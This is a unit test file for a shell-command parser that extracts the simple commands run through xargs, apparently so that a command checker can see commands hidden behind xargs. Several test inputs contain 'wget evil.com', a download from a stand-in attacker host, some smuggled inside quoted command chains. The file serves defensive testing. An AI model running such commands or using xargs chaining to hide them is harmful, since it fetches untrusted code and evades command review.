import { extractSimpleCommands } from '../../extractSimpleCommands.js';

describe('extractCommandLineFromXargs', () => {
  it.each([
    // Basic xargs with command
    {
      commandLine: 'find . | xargs grep foo',
      expected: ['find .', 'grep foo'],
    },
    {
      commandLine: 'find . | xargs wget evil.com',
      expected: ['find .', 'wget evil.com'],
    },

    // xargs with quoted complex command
    {
      commandLine: "find . | xargs 'echo ok && wget evil.com'",
      expected: ['find .', 'echo ok', 'wget evil.com'],
    },

    // xargs with flags
    {
      commandLine: 'xargs -n 10 wget evil.com && echo yes',
      expected: ['wget evil.com', 'echo yes'],
    },
    {
      commandLine: "find . | xargs -I {} -n 1 'echo {} && wget evil.com'",
      expected: ['find .', 'echo {}', 'wget evil.com'],
    },

    // xargs with environment variables
    {
      commandLine: 'FOO=bar xargs wget evil.com',
      expected: ['wget evil.com'],
    },

    // Chained xargs
    {
      commandLine: 'find . | xargs grep foo | xargs wget evil',
      expected: ['find .', 'grep foo', 'wget evil'],
    },

    // xargs without command (no extraction)
    {
      commandLine: "echo 'one two three' | xargs",
      expected: ["echo 'one two three'"],
    },

    // xargs with time prefix
    {
      commandLine: 'time xargs grep foo',
      expected: ['grep foo'],
    },
    {
      commandLine: 'xargs time grep foo',
      expected: ['grep foo'],
    },

    // xargs in control structures
    {
      commandLine: 'while true; do xargs grep foo; done',
      expected: ['true', 'grep foo'],
    },
    {
      commandLine: 'for i in 1 2; do xargs echo $i; done',
      expected: ['echo $i'],
    },

    // xargs with unquoted command
    {
      commandLine: 'xargs echo hello world',
      expected: ['echo hello world'],
    },
  ])('$commandLine', ({ commandLine, expected }) => {
    const actual = extractSimpleCommands(commandLine);
    expect(actual).toEqual(expected);
  });
});
